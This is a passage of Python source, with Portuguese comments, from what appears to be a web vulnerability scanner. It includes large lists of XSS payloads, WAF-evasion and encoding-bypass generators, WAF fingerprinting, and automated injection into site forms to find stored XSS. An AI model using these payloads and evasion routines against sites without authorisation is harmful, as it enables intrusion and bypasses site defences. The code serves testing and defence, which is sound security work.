        console.print(stats_table)
        console.print()
        
        # Resultados de vulnerabilidades
        if not self.vulnerable_points:
            console.print("[bold green]✅ NENHUMA VULNERABILIDADE ENCONTRADA[/bold green]")
            console.print("[green]O site aparenta estar protegido contra SQL Injection[/green]")
        else:
            console.print(f"[bold red]🚨 {len(self.vulnerable_points)} VULNERABILIDADE(S) ENCONTRADA(S)[/bold red]")
            
            vuln_table = Table(title="Vulnerabilidades de SQL Injection Detectadas", show_header=True, header_style="bold red")
            vuln_table.add_column("Risco", justify="center", style="bold red", width=8)
            vuln_table.add_column("Tipo", style="magenta", width=20)
            vuln_table.add_column("Localização", style="cyan", width=40)
            vuln_table.add_column("Técnica & Payload", style="yellow", width=50)
            vuln_table.add_column("Recomendação", style="white", width=35)
            
            for finding in self.vulnerable_points:
                vuln_table.add_row(
                    finding['Risco'],
                    finding['Tipo'], 
                    finding['Detalhe'],
                    finding['Recomendação'].split('.')[0] if '.' in finding['Recomendação'] else finding['Recomendação'][:50],
                    "Usar prepared statements e validação de entrada"
                )
            
            console.print(vuln_table)
            
            # Recomendações gerais
            console.print("\n[bold yellow]🛡️  RECOMENDAÇÕES DE SEGURANÇA:[/bold yellow]")
            recommendations = [
                "1. Use prepared statements/parametrized queries",
                "2. Implemente validação rigorosa de entrada",
                "3. Configure um WAF (Web Application Firewall)",
                "4. Aplique o princípio do menor privilégio no banco",
                "5. Mantenha o sistema de banco atualizado"
            ]
            for rec in recommendations:
                console.print(f"   [white]{rec}[/white]")
        
        console.print(f"\n[bold cyan]{'═' * 60}[/bold cyan]")

def sql_injection_scan(url, level=1, dbms=None, collaborator_url=None):
    SQLiScanner(url, level=level, dbms=dbms, collaborator_url=collaborator_url).run_scan()

# --- MÓDULO 15: SCANNER DE XSS (CROSS-SITE SCRIPTING) MELHORADO ---

class XSSScanner:
    def __init__(self, base_url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.vulnerable_points = []
        self.payloads = self._load_payloads(custom_payloads_file)
        self.scan_stored = scan_stored
        self.fuzz_dom = fuzz_dom # Placeholder for future implementation
        
        # Configurações padrão das novas funcionalidades (podem ser sobrescritas externamente)
        self.enable_bypasses = True
        self.context_analysis = True
        self.validate_execution = True
        self.analyze_csp = True
        self.verbose = False

    def _load_payloads(self, custom_payloads_file):
        """Carrega payloads de um ficheiro ou usa payloads categorizados padrão."""
        default_payloads = self._get_default_payloads()
        
        if custom_payloads_file:
            try:
                with open(custom_payloads_file, 'r', errors='ignore') as f:
                    payloads = [line.strip() for line in f if line.strip()]
                    if not payloads:
                        console.print(f"[bold yellow]Aviso: O ficheiro de payloads '{custom_payloads_file}' está vazio. Usando payloads padrão.[/bold yellow]")
                        return default_payloads
                    console.print(f"[*] Carregados [bold cyan]{len(payloads)}[/bold cyan] payloads de XSS de '{custom_payloads_file}'.")
                    return payloads
            except FileNotFoundError:
                console.print(f"[bold red][!] Erro: O ficheiro de payloads '{custom_payloads_file}' não foi encontrado. Usando payloads padrão.[/bold red]")
                return default_payloads
        return default_payloads
    
    def _get_default_payloads(self):
        """Retorna payloads categorizados por contexto."""
        payloads = {
            'html': [
                "<script>alert('xss-test-spectra')</script>",
                "<img src=x onerror=alert('xss-test-spectra')>",
                "<svg onload=alert('xss-test-spectra')>",
                "<iframe src=javascript:alert('xss-test-spectra')>",
                "<body onload=alert('xss-test-spectra')>",
                "<div onclick=alert('xss-test-spectra')>Click</div>",
                "<marquee onstart=alert('xss-test-spectra')>",
                "<video src=x onerror=alert('xss-test-spectra')>",
                "<audio src=x onerror=alert('xss-test-spectra')>",
                "<object data=javascript:alert('xss-test-spectra')>",
                "<embed src=javascript:alert('xss-test-spectra')>",
                "<base href=javascript:alert('xss-test-spectra')//>",
                "<link rel=stylesheet href=javascript:alert('xss-test-spectra')>",
                "<meta http-equiv=refresh content=0;url=javascript:alert('xss-test-spectra')>",
                "<form action=javascript:alert('xss-test-spectra')><input type=submit>",
                "<table background=javascript:alert('xss-test-spectra')>",
                "<td background=javascript:alert('xss-test-spectra')>",
                "<input type=image src=x onerror=alert('xss-test-spectra')>",
                "<button onclick=alert('xss-test-spectra')>Click</button>",
                "<select onfocus=alert('xss-test-spectra')>",
                "<textarea onfocus=alert('xss-test-spectra')>",
                "<keygen onfocus=alert('xss-test-spectra')>",
                "<details open ontoggle=alert('xss-test-spectra')>",
                "<summary onclick=alert('xss-test-spectra')>Click</summary>"
            ],
            'attribute': [
                "' onmouseover=alert('xss-test-spectra') '",
                "\" onmouseover=alert('xss-test-spectra') \"",
                "' onfocus=alert('xss-test-spectra') '",
                "\" onfocus=alert('xss-test-spectra') \"",
                "' onclick=alert('xss-test-spectra') '",
                "\" onclick=alert('xss-test-spectra') \"",
                "' onload=alert('xss-test-spectra') '",
                "\" onload=alert('xss-test-spectra') \"",
                "' onerror=alert('xss-test-spectra') '",
                "\" onerror=alert('xss-test-spectra') \"",
                "' onblur=alert('xss-test-spectra') '",
                "\" onblur=alert('xss-test-spectra') \"",
                "' onchange=alert('xss-test-spectra') '",
                "\" onchange=alert('xss-test-spectra') \"",
                "' onkeyup=alert('xss-test-spectra') '",
                "\" onkeyup=alert('xss-test-spectra') \"",
                "' onkeydown=alert('xss-test-spectra') '",
                "\" onkeydown=alert('xss-test-spectra') \"",
                "' onsubmit=alert('xss-test-spectra') '",
                "\" onsubmit=alert('xss-test-spectra') \"",
                "javascript:alert('xss-test-spectra')",
                "vbscript:alert('xss-test-spectra')",
                "data:text/html,<script>alert('xss-test-spectra')</script>"
            ],
            'javascript': [
                "';alert('xss-test-spectra');//",
                "\";alert('xss-test-spectra');//",
                "';alert('xss-test-spectra');var a='",
                "\";alert('xss-test-spectra');var a=\"",
                "\\';alert('xss-test-spectra');//",
                "\\\";alert('xss-test-spectra');//",
                "</script><script>alert('xss-test-spectra')</script>",
                "/**/alert('xss-test-spectra')/**/",
                "eval(alert('xss-test-spectra'))",
                "Function('alert(\"xss-test-spectra\")')();",
                "setTimeout(alert('xss-test-spectra'),0)",
                "setInterval(alert('xss-test-spectra'),0)",
                "window['alert']('xss-test-spectra')",
                "parent.alert('xss-test-spectra')",
                "top.alert('xss-test-spectra')",
                "this.alert('xss-test-spectra')",
                "frames.alert('xss-test-spectra')",
                "content.alert('xss-test-spectra')",
                "self.alert('xss-test-spectra')"
            ],
            'css': [
                "expression(alert('xss-test-spectra'))",
                "/**/expression(alert('xss-test-spectra'))",
                "url(javascript:alert('xss-test-spectra'))",
                "@import 'javascript:alert(\"xss-test-spectra\")'",
                "background:url(javascript:alert('xss-test-spectra'))",
                "background-image:url(javascript:alert('xss-test-spectra'))",
                "list-style-image:url(javascript:alert('xss-test-spectra'))",
                "content:url(javascript:alert('xss-test-spectra'))"
            ],
            'polyglot': [
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('xss-test-spectra')//'>",
                "\"'><img src=x onerror=alert('xss-test-spectra')>",
                "';alert('xss-test-spectra');//'><script>alert('xss-test-spectra')</script>",
                "\"><svg/onload=alert('xss-test-spectra')>",
                "*/alert('xss-test-spectra')/*",
                "<!--<img src=x onerror=alert('xss-test-spectra')>-->",
                "<![CDATA[<img src=x onerror=alert('xss-test-spectra')>]]>",
                "<?xml version=\"1.0\"?><script>alert('xss-test-spectra')</script>",
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('xss-test-spectra') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('xss-test-spectra')//\\x3e"
            ],
            'bypass': [
                # Encoding bypasses
                "%3Cscript%3Ealert('xss-test-spectra')%3C/script%3E",
                "&#60;script&#62;alert('xss-test-spectra')&#60;/script&#62;",
                "&lt;script&gt;alert('xss-test-spectra')&lt;/script&gt;",
                "\\u003cscript\\u003ealert('xss-test-spectra')\\u003c/script\\u003e",
                "\\x3Cscript\\x3Ealert('xss-test-spectra')\\x3C/script\\x3E",
                # Case variation
                "<ScRiPt>alert('xss-test-spectra')</ScRiPt>",
                "<SCRIPT>alert('xss-test-spectra')</SCRIPT>",
                "<Script>alert('xss-test-spectra')</Script>",
                # Comment injection
                "<scr<!---->ipt>alert('xss-test-spectra')</scr<!---->ipt>",
                "<scr/**/ipt>alert('xss-test-spectra')</scr/**/ipt>",
                # Null byte injection
                "<script\\x00>alert('xss-test-spectra')</script>",
                "<script\\x0A>alert('xss-test-spectra')</script>",
                "<script\\x0D>alert('xss-test-spectra')</script>",
                # Tab and newline variations
                "<script\t>alert('xss-test-spectra')</script>",
                "<script\n>alert('xss-test-spectra')</script>",
                "<script\r>alert('xss-test-spectra')</script>",
                # Double encoding
                "%253Cscript%253Ealert('xss-test-spectra')%253C/script%253E",
                # Unicode normalization
                "＜script＞alert('xss-test-spectra')＜/script＞",
                "﹤script﹥alert('xss-test-spectra')﹤/script﹥"
            ]
        }
        
        # Combina todos os payloads em uma lista plana
        all_payloads = []
        for category, payload_list in payloads.items():
            all_payloads.extend(payload_list)
        
        return all_payloads
    
    def _detect_context(self, response_text, payload):
        """Detecta o contexto onde o payload foi refletido."""
        contexts = []
        
        # Verifica se está em um script tag
        if re.search(r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>', response_text, re.DOTALL | re.IGNORECASE):
            contexts.append('script')
        
        # Verifica se está em um atributo HTML
        attr_pattern = r'[a-zA-Z-]+\s*=\s*[\'"].*?' + re.escape(payload) + r'.*?[\'"]'
        if re.search(attr_pattern, response_text, re.IGNORECASE):
            contexts.append('attribute')
        
        # Verifica se está em um event handler
        event_pattern = r'on[a-zA-Z]+\s*=\s*[\'"].*?' + re.escape(payload) + r'.*?[\'"]'
        if re.search(event_pattern, response_text, re.IGNORECASE):
            contexts.append('event_handler')
        
        # Verifica se está em CSS
        css_pattern = r'<style[^>]*>.*?' + re.escape(payload) + r'.*?</style>'
        if re.search(css_pattern, response_text, re.DOTALL | re.IGNORECASE):
            contexts.append('css')
        
        # Verifica se está em URL (href, src, etc.)
        url_pattern = r'(?:href|src|action|formaction)\s*=\s*[\'"].*?' + re.escape(payload) + r'.*?[\'"]'
        if re.search(url_pattern, response_text, re.IGNORECASE):
            contexts.append('url')
        
        # Verifica se está em texto HTML normal
        if payload in response_text and not contexts:
            contexts.append('html_text')
        
        return contexts
    
    def _get_context_specific_payloads(self, contexts):
        """Retorna payloads específicos para os contextos detectados."""
        payload_map = {
            'html_text': [
                "<script>alert('xss-context-html')</script>",
                "<img src=x onerror=alert('xss-context-html')>",
                "<svg onload=alert('xss-context-html')>",
                "<!--<script>alert('xss-context-html')</script>-->"
            ],
            'attribute': [
                "\" onmouseover=alert('xss-context-attr') \"",
                "' onmouseover=alert('xss-context-attr') '",
                "\" autofocus onfocus=alert('xss-context-attr') \"",
                "' autofocus onfocus=alert('xss-context-attr') '",
                "javascript:alert('xss-context-attr')"
            ],
            'script': [
                "';alert('xss-context-script');//",
                "\";alert('xss-context-script');//",
                "*/alert('xss-context-script')/*",
                "</script><script>alert('xss-context-script')</script>",
                "\\';alert('xss-context-script');//"
            ],
            'event_handler': [
                "alert('xss-context-event')",
                "javascript:alert('xss-context-event')",
                "eval(alert('xss-context-event'))"
            ],
            'css': [
                "expression(alert('xss-context-css'))",
                "url(javascript:alert('xss-context-css'))",
                "/**/expression(alert('xss-context-css'))"
            ],
            'url': [
                "javascript:alert('xss-context-url')",
                "data:text/html,<script>alert('xss-context-url')</script>",
                "vbscript:alert('xss-context-url')"
            ]
        }
        
        context_payloads = []
        for context in contexts:
            if context in payload_map:
                context_payloads.extend(payload_map[context])
        
        return context_payloads if context_payloads else payload_map['html_text']
    
    def _analyze_csp(self, response):
        """Analisa Content Security Policy se presente."""
        csp_header = response.headers.get('Content-Security-Policy', '')
        if not csp_header:
            csp_header = response.headers.get('Content-Security-Policy-Report-Only', '')
        
        if csp_header:
            csp_info = {
                'present': True,
                'header': csp_header,
                'allows_inline_script': "'unsafe-inline'" in csp_header or 'script-src' not in csp_header,
                'allows_eval': "'unsafe-eval'" in csp_header,
                'allows_data_uri': 'data:' in csp_header,
                'report_only': 'Content-Security-Policy-Report-Only' in response.headers
            }
            return csp_info
        
        return {'present': False}
    
    def _apply_encoding_bypass(self, payload):
        """Aplica diferentes técnicas de encoding para bypass de filtros."""
        bypass_variants = []
        
        # URL encoding
        import urllib.parse
        bypass_variants.append(urllib.parse.quote(payload))
        bypass_variants.append(urllib.parse.quote(payload, safe=''))
        
        # Double URL encoding
        double_encoded = urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        bypass_variants.append(double_encoded)
        
        # HTML entity encoding
        html_encoded = ''.join(f'&#{ord(c)};' for c in payload)
        bypass_variants.append(html_encoded)
        
        # Hex encoding
        hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in payload)
        bypass_variants.append(hex_encoded)
        
        # Unicode encoding
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in payload)
        bypass_variants.append(unicode_encoded)
        
        # Mixed case (para tags HTML)
        if '<' in payload and '>' in payload:
            mixed_case = ''
            for char in payload:
                if char.isalpha():
                    mixed_case += char.upper() if len(mixed_case) % 2 == 0 else char.lower()
                else:
                    mixed_case += char
            bypass_variants.append(mixed_case)
        
        return bypass_variants
    
    def _apply_waf_evasion(self, payload):
        """Aplica técnicas de evasão de WAF."""
        evasion_variants = []
        
        # Comment injection
        if '<script>' in payload.lower():
            evasion_variants.append(payload.replace('<script>', '<scr<!---->ipt>').replace('</script>', '</scr<!---->ipt>'))
            evasion_variants.append(payload.replace('<script>', '<scr/**/ipt>').replace('</script>', '</scr/**/ipt>'))
        
        # Null byte injection
        evasion_variants.append(payload.replace('<', '<\\x00').replace('>', '\\x00>'))
        
        # Tab and newline injection
        evasion_variants.append(payload.replace('<script>', '<script\\t>'))
        evasion_variants.append(payload.replace('<script>', '<script\\n>'))
        evasion_variants.append(payload.replace('<script>', '<script\\r>'))
        
        # Alternative quotes
        if "'" in payload:
            evasion_variants.append(payload.replace("'", '"'))
            evasion_variants.append(payload.replace("'", '`'))
        
        # Whitespace variations
        evasion_variants.append(payload.replace(' ', '\\t'))
        evasion_variants.append(payload.replace(' ', '\\n'))
        evasion_variants.append(payload.replace(' ', '/'))
        
        # Alternative event handlers
        if 'onerror' in payload.lower():
            evasion_variants.append(payload.replace('onerror', 'onload'))
            evasion_variants.append(payload.replace('onerror', 'onfocus'))
            evasion_variants.append(payload.replace('onerror', 'onmouseover'))
        
        # Protocol variations
        if 'javascript:' in payload.lower():
            evasion_variants.append(payload.replace('javascript:', 'data:text/html,'))
            evasion_variants.append(payload.replace('javascript:', 'vbscript:'))
        
        return evasion_variants
    
    def _detect_waf(self, response):
        """Detecta possível presença de WAF baseado em headers e conteúdo."""
        waf_indicators = {
            'cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'akamai': ['akamai', 'ak-bmsc'],
            'aws_waf': ['awselb', 'awsalb'],
            'incapsula': ['incap_ses', 'incapsula'],
            'sucuri': ['sucuri', 'x-sucuri'],
            'barracuda': ['barracuda', 'barra'],
            'f5_bigip': ['bigip', 'f5-'],
            'fortinet': ['fortigate', 'fortiweb'],
            'generic': ['blocked', 'forbidden', 'suspicious', 'malicious', 'attack']
        }
        
        detected_wafs = []
        headers_text = ' '.join([f"{k}: {v}" for k, v in response.headers.items()]).lower()
        content_text = response.text.lower()
        
        for waf_name, indicators in waf_indicators.items():
            for indicator in indicators:
                if indicator in headers_text or indicator in content_text:
                    detected_wafs.append(waf_name)
                    break
        
        return detected_wafs
    
    def _test_with_bypasses(self, url, param, base_payload, method, form_data=None):
        """Testa um payload com várias técnicas de bypass."""
        successful_bypasses = []
        
        # Testa o payload original primeiro
        try:
            test_data = {param: base_payload}
            if method.lower() == 'get':
                response = self.session.get(url, params=test_data, timeout=7, verify=False)
            else:
                post_payload = (form_data or {}).copy()
                post_payload[param] = base_payload
                response = self.session.post(url, data=post_payload, timeout=7, verify=False)
            
            # Detecta WAF
            detected_wafs = self._detect_waf(response)
            
            if base_payload in response.text:
                return [{'payload': base_payload, 'technique': 'original', 'waf_detected': detected_wafs}]
            
            # Se o payload original não funcionou, tenta bypasses
            encoding_variants = self._apply_encoding_bypass(base_payload)
            waf_evasion_variants = self._apply_waf_evasion(base_payload)
            
            all_variants = encoding_variants + waf_evasion_variants
            
            for variant in all_variants[:15]:  # Limita para performance
                test_data = {param: variant}
                try:
                    if method.lower() == 'get':
                        response = self.session.get(url, params=test_data, timeout=7, verify=False)
                    else:
                        post_payload = (form_data or {}).copy()
                        post_payload[param] = variant
                        response = self.session.post(url, data=post_payload, timeout=7, verify=False)
                    
                    if variant in response.text or base_payload in response.text:
                        technique = 'encoding' if variant in encoding_variants else 'waf_evasion'
                        successful_bypasses.append({
                            'payload': variant,
                            'technique': technique,
                            'waf_detected': detected_wafs
                        })
                        break  # Para na primeira técnica bem-sucedida
                        
                except requests.RequestException:
                    continue
                    
        except requests.RequestException:
            pass
        
        return successful_bypasses
    
    def _validate_javascript_execution(self, url, param, payload, method, form_data=None):
        """Valida se o JavaScript pode ser executado usando técnicas de análise de resposta."""
        validation_results = {
            'likely_executable': False,
            'confidence': 'low',
            'indicators': [],
            'response_changes': []
        }
        
        # Payloads de validação específicos
        validation_payloads = [
            # Payload que altera o título da página
            payload.replace("alert('xss-test-spectra')", "document.title='XSS-VALIDATION-SPECTRA'"),
            # Payload que adiciona elemento ao DOM
            payload.replace("alert('xss-test-spectra')", "document.body.innerHTML+='<div id=\"xss-validation-spectra\">XSS</div>'"),
            # Payload que executa callback
            payload.replace("alert('xss-test-spectra')", "fetch('/xss-callback-validation').catch(()=>{})"),
            # Payload que modifica URL
            payload.replace("alert('xss-test-spectra')", "window.location.hash='xss-validation'"),
        ]
        
        for validation_payload in validation_payloads:
            try:
                test_data = {param: validation_payload}
                if method.lower() == 'get':
                    response = self.session.get(url, params=test_data, timeout=7, verify=False)
                else:
                    post_payload = (form_data or {}).copy()
                    post_payload[param] = validation_payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)
                
                # Verifica indicadores de execução
                if 'XSS-VALIDATION-SPECTRA' in response.text:
                    validation_results['indicators'].append('title_change')
                    validation_results['likely_executable'] = True
                    validation_results['confidence'] = 'high'
                
                if 'xss-validation-spectra' in response.text.lower():
                    validation_results['indicators'].append('dom_modification')
                    validation_results['likely_executable'] = True
                    validation_results['confidence'] = 'medium'
                
                # Verifica mudanças na estrutura HTML
                if validation_payload in response.text:
                    # Analisa se o payload está em posição executável
                    soup = BeautifulSoup(response.text, 'html.parser')
                    scripts = soup.find_all('script')
                    for script in scripts:
                        if validation_payload in str(script):
                            validation_results['indicators'].append('script_context')
                            validation_results['likely_executable'] = True
                            validation_results['confidence'] = 'high'
                            break
                    
                    # Verifica event handlers
                    for tag in soup.find_all(attrs=True):
                        for attr, value in tag.attrs.items():
                            if attr.startswith('on') and validation_payload in str(value):
                                validation_results['indicators'].append('event_handler')
                                validation_results['likely_executable'] = True
                                validation_results['confidence'] = 'high'
                                break
                
                # Analisa Content-Type
                content_type = response.headers.get('Content-Type', '').lower()
                if 'text/html' in content_type or 'application/xhtml' in content_type:
                    validation_results['indicators'].append('html_content_type')
                elif 'application/json' in content_type:
                    validation_results['confidence'] = 'low'  # JSON XSS é mais difícil
                
                break  # Para no primeiro payload que reflete
                
            except requests.RequestException:
                continue
        
        return validation_results
    
    def _improve_form_analysis(self, form):
        """Analisa formulários de forma mais detalhada."""
        form_info = {
            'action': form.get('action', ''),
            'method': form.get('method', 'get').lower(),
            'fields': [],
            'hidden_fields': [],
            'csrf_tokens': [],
            'file_uploads': False,
            'ajax_likely': False
        }
        
        # Analisa todos os campos
        for field in form.find_all(['input', 'textarea', 'select']):
            field_info = {
                'name': field.get('name', ''),
                'type': field.get('type', 'text'),
                'value': field.get('value', ''),
                'required': field.has_attr('required'),
                'readonly': field.has_attr('readonly'),
                'disabled': field.has_attr('disabled')
            }
            
            if field_info['type'] == 'hidden':
                form_info['hidden_fields'].append(field_info)
                # Detecta possíveis tokens CSRF
                if any(csrf_name in field_info['name'].lower() for csrf_name in ['csrf', 'token', '_token', 'authenticity']):
                    form_info['csrf_tokens'].append(field_info)
            elif field_info['type'] == 'file':
                form_info['file_uploads'] = True
            else:
                form_info['fields'].append(field_info)
        
        # Detecta possível AJAX baseado em atributos
        if form.get('data-remote') or form.get('data-ajax') or 'ajax' in str(form.get('class', '')).lower():
            form_info['ajax_likely'] = True
        
        # Analisa JavaScript inline no formulário
        if form.get('onsubmit') or form.find('script'):
            form_info['ajax_likely'] = True
        
        return form_info

    def _add_finding(self, risk, v_type, detail, recommendation):
        """Adiciona ou atualiza uma descoberta, priorizando XSS Armazenado."""
        # Verifica se uma descoberta para este 'detalhe' já existe
        for i, finding in enumerate(self.vulnerable_points):
            if finding["Detalhe"] == detail:
                # Se a nova descoberta for "Armazenado" e a existente não for, atualiza-a.
                if v_type == "XSS Armazenado" and finding["Tipo"] != "XSS Armazenado":
                    self.vulnerable_points[i].update({
                        "Risco": "Alto",
                        "Tipo": "XSS Armazenado",
                        "Recomendação": recommendation
                    })
                return  # Evita adicionar uma duplicada

        # Se não houver correspondência, adiciona a nova descoberta
        self.vulnerable_points.append({"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation})

    def _scan_reflected(self, tasks, progress):
        """Executa o scan para XSS Refletido com detecção context-aware."""
        task_id = progress.add_task("[green]Testando XSS Refletido...", total=len(tasks))
        for method, url, param, form_data in tasks:
            progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan] (Refletido)...")
            
            # Primeiro, testa com um payload simples para detectar contexto
            test_payload = "xss-context-test-12345"
            test_data = {param: test_payload}
            context_detected = False
            
            try:
                if method.lower() == 'get':
                    response = self.session.get(url, params=test_data, timeout=7, verify=False)
                else: # POST
                    post_payload = (form_data or {}).copy()
                    post_payload[param] = test_payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)

                # Analisa CSP
                csp_info = self._analyze_csp(response)
                
                if test_payload in response.text:
                    # Detecta contexto onde o payload foi refletido
                    contexts = self._detect_context(response.text, test_payload)
                    
                    if contexts:
                        context_detected = True
                        context_payloads = self._get_context_specific_payloads(contexts)
                        
                        # Testa payloads específicos para o contexto detectado
                        for context_payload in context_payloads:
                            test_data_context = {param: context_payload}
                            try:
                                if method.lower() == 'get':
                                    context_response = self.session.get(url, params=test_data_context, timeout=7, verify=False)
                                else:
                                    post_payload_context = (form_data or {}).copy()
                                    post_payload_context[param] = context_payload
                                    context_response = self.session.post(url, data=post_payload_context, timeout=7, verify=False)
                                
                                if context_payload in context_response.text:
                                    detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                                    context_str = ', '.join(contexts)
                                    csp_warning = ""
                                    if csp_info['present']:
                                        if csp_info['report_only']:
                                            csp_warning = " (CSP em modo Report-Only)"
                                        elif csp_info['allows_inline_script']:
                                            csp_warning = " (CSP permite scripts inline)"
                                        else:
                                            csp_warning = " (CSP presente mas pode ter bypass)"
                                    
                                    rec = f"Payload '{context_payload}' foi refletido no contexto: {context_str}{csp_warning}. Validar execução manual."
                                    
                                    # Ajusta o risco baseado no contexto e CSP
                                    risk = "Alto" if any(ctx in ['script', 'event_handler', 'html_text'] for ctx in contexts) else "Médio"
                                    if csp_info['present'] and not csp_info['allows_inline_script'] and not csp_info['report_only']:
                                        risk = "Médio"  # Reduz o risco se CSP está ativo
                                    
                                    self._add_finding(risk, "XSS Refletido", detail, rec)
                                    break
                            except requests.RequestException:
                                continue
                        
                        if context_detected:
                            break  # Passou para o próximo parâmetro se encontrou um contexto
                
                # Se não detectou contexto específico, testa com payloads gerais e bypasses
                if not context_detected:
                    for payload in self.payloads[:5]:  # Reduz para 5 payloads base
                        # Primeiro testa o payload normal
                        test_data = {param: payload}
                        try:
                            if method.lower() == 'get':
                                response = self.session.get(url, params=test_data, timeout=7, verify=False)
                            else:
                                post_payload = (form_data or {}).copy()
                                post_payload[param] = payload
                                response = self.session.post(url, data=post_payload, timeout=7, verify=False)

                            if payload in response.text:
                                detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                                rec = f"Payload '{payload}' foi refletido sem sanitização."
                                self._add_finding("Médio", "XSS Refletido", detail, rec)
                                break
                            
                            # Se o payload normal não funcionou, testa com bypasses
                            bypass_results = self._test_with_bypasses(url, param, payload, method, form_data)
                            if bypass_results:
                                result = bypass_results[0]
                                detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                                waf_info = f" (WAF detectado: {', '.join(result['waf_detected'])})" if result['waf_detected'] else ""
                                rec = f"Payload '{result['payload']}' contornou filtros usando técnica: {result['technique']}{waf_info}."
                                risk = "Alto" if result['technique'] in ['original', 'waf_evasion'] else "Médio"
                                self._add_finding(risk, "XSS Refletido", detail, rec)
                                break
                                
                        except requests.RequestException:
                            continue
                            
            except requests.RequestException:
                pass
        progress.remove_task(task_id)

    def _inject_into_forms(self, forms, progress):
        """Submete payloads em todos os formulários encontrados com análise aprimorada."""
        total_fields = 0
        analyzed_forms = []
        
        # Analisa todos os formulários primeiro
        for form in forms:
            form_info = self._improve_form_analysis(form)
            if form_info['fields']:  # Só processa se tem campos testáveis
                analyzed_forms.append((form, form_info))
                total_fields += len(form_info['fields'])
        
        if total_fields == 0:
            return
            
        submission_task = progress.add_task("[green]Submetendo payloads (Stored XSS)...", total=total_fields * len(self.payloads[:10]))
        
        for form, form_info in analyzed_forms:
            action = urljoin(self.base_url, form_info['action']) if form_info['action'] else self.base_url
            method = form_info['method']
            
            if method != 'post':
                progress.update(submission_task, advance=len(self.payloads[:10]) * len(form_info['fields']))
                continue

            # Prepara dados base do formulário
            base_data = {}
            
            # Inclui campos hidden (incluindo CSRFs)
            for hidden_field in form_info['hidden_fields']:
                if hidden_field['name']:
                    base_data[hidden_field['name']] = hidden_field['value']
            
            # Valores padrão para campos normais
            for field_info in form_info['fields']:
                if field_info['name'] and not field_info['disabled'] and not field_info['readonly']:
                    if field_info['type'] == 'email':
                        base_data[field_info['name']] = 'test@example.com'
                    elif field_info['type'] == 'number':
                        base_data[field_info['name']] = '123'
                    elif field_info['type'] == 'url':
                        base_data[field_info['name']] = 'http://example.com'
                    else:
                        base_data[field_info['name']] = 'test'
            
            # Testa cada campo com payloads
            for field_info in form_info['fields']:
                if not field_info['name'] or field_info['disabled'] or field_info['readonly']:
                    continue
                
                field_name = field_info['name']
                
                # Seleciona payloads apropriados baseado no tipo de campo
                if field_info['type'] in ['email', 'url']:
                    # Para campos de email/URL, usa payloads específicos
                    test_payloads = [
                        "test+<script>alert('xss')</script>@example.com",
                        "http://example.com/<script>alert('xss')</script>",
                        "javascript:alert('xss')"
                    ]
                else:
                    test_payloads = self.payloads[:10]  # Limita para performance
                
                for payload in test_payloads:
                    progress.update(submission_task, advance=1, description=f"[green]Testando campo [cyan]{field_name}[/cyan]...")
                    
                    # Cria dados de teste
                    test_data = base_data.copy()
                    test_data[field_name] = payload
                    
                    try:
                        if form_info['ajax_likely']:
                            # Para formulários AJAX, adiciona headers apropriados
                            headers = {
                                'X-Requested-With': 'XMLHttpRequest',
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                            self.session.post(action, data=test_data, headers=headers, timeout=7, verify=False)
                        else:
                            self.session.post(action, data=test_data, timeout=7, verify=False)
                            
                    except requests.RequestException:
                        continue
        
        progress.remove_task(submission_task)

    def _verify_storage(self, progress):
        """Rasteia o site para verificar a persistência dos payloads."""
        crawl_task = progress.add_task("[green]Verificando páginas para Stored XSS...", total=None)
        
        to_visit = [self.base_url]
        visited = set()
        
        while to_visit:
            current_url = to_visit.pop(0)
            if current_url in visited:
                continue
            visited.add(current_url)
            progress.update(crawl_task, advance=1, description=f"Verificando {current_url[:60]}...")

            try:
                response = self.session.get(current_url, timeout=7, verify=False)
                # Usar BeautifulSoup para lidar melhor com diferentes codificações
                soup = BeautifulSoup(response.content, 'html.parser', from_encoding=response.encoding)
                page_text = soup.get_text()

                for payload in self.payloads:
                    if payload in response.text or payload in page_text:
                        # Se o payload for encontrado, tenta encontrar uma descoberta de XSS Refletido correspondente para atualizar
                        # Esta é uma heurística; pode não identificar o parâmetro exato, mas atualiza o tipo de vulnerabilidade
                        found_and_upgraded = False
                        for finding in self.vulnerable_points:
                            if payload in finding["Recomendação"]:
                                self._add_finding("Alto", "XSS Armazenado", finding["Detalhe"], f"Payload '{payload}' foi submetido e persistiu na aplicação.")
                                found_and_upgraded = True
                        
                        if not found_and_upgraded:
                            detail = f"Payload persistiu e foi encontrado em {current_url}"
                            self._add_finding("Alto", "XSS Armazenado", detail, f"Payload '{payload}' foi submetido e persistiu na aplicação.")

                base_netloc = urlparse(self.base_url).netloc
                for link_tag in soup.find_all('a', href=True):
                    link = urljoin(self.base_url, link_tag['href'])
                    if urlparse(link).netloc == base_netloc and link not in visited:
                        to_visit.append(link)
            except (requests.RequestException, UnicodeDecodeError):
                continue
        progress.remove_task(crawl_task)

    def run_scan(self, return_findings=False):
        """Orquestra os diferentes tipos de scans de XSS."""
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando scanner de XSS em: [bold cyan]{self.base_url}[/bold cyan]")
            if self.scan_stored: console.print("[*] Modo XSS Armazenado: [bold green]Ativado[/bold green]")
            if self.fuzz_dom: console.print("[*] Modo XSS DOM: [bold green]Ativado[/bold green]")
            console.print("-" * 60)

        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
